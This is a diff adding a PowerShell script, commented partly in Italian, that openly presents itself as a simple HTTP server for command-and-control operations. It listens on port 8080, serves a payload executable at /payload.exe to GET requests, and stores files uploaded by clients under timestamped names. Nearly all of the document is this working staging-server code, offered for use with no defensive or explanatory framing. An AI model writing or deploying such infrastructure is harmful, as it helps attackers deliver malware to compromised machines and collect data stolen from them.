@@ -1,0 +1,50 @@
+#       // >> __  ^^ ** || §§ ùù Simple HTTP Server in PowerShell for C2 operations ùù §§ || ** ^^ __ << \\
+#       // This script listens for GET requests to serve a payload and POST requests to receive uploads \\
+#       // >> __ ^^ Requires PowerShell 5.0 or higher Usage: Run this script on the server machine ^^ __ << \\
+# 
+# Note: Adjust file paths as necessary Ensure you have the necessary permissions to bind to the specified port
+# 
+#       // >> __  ^^ ** || §§ ùù Run as Administrator to bind to port 8080 ùù §§ || ** ^^ __ << \\
+#       // >> __  ^^ **  This is a basic implementation and should be enhanced for production use ** ^^ __ << \\
+#
+
+Add-Type -AssemblyName System.Net.HttpListener
+$listener = New-Object System.Net.HttpListener
+$prefix = "http://+:8080/"
+$listener.Prefixes.Add($prefix)
+$listener.Start()
+Write-Output "Server C2 in ascolto su $prefix"
+
+while ($true) {
+    $context = $listener.GetContext()
+    $request = $context.Request
+    $response = $context.Response
+    
+    if ($request.HttpMethod -eq "GET") {
+        # Scarica file: il client richiede /payload.exe
+        $filePath = "C:\Path\To\payload.exe"
+        if ($request.RawUrl -eq "/payload.exe" -and (Test-Path $filePath)) {
+            $bytes = [System.IO.File]::ReadAllBytes($filePath)
+            $response.ContentType = "application/octet-stream"
+            $response.OutputStream.Write($bytes, 0, $bytes.Length)
+            $response.StatusCode = 200
+        } else {
+            $response.StatusCode = 404
+            $response.StatusDescription = "File not found"
+        }
+    }
+    elseif ($request.HttpMethod -eq "POST") {
+        # Upload file dal client, salvataggio sul server
+        $filename = "upload_" + (Get-Date -Format "yyyyMMddHHmmss") + ".bin"
+        $filePath = Join-Path "C:\Path\To\Uploads" $filename
+        
+        $inputStream = $request.InputStream
+        $fs = [System.IO.File]::Create($filePath)
+        $inputStream.CopyTo($fs)
+        $fs.Close()
+        
+        $response.StatusCode = 200
+        $response.StatusDescription = "Upload successful"
+    }
+    $response.Close()
+}
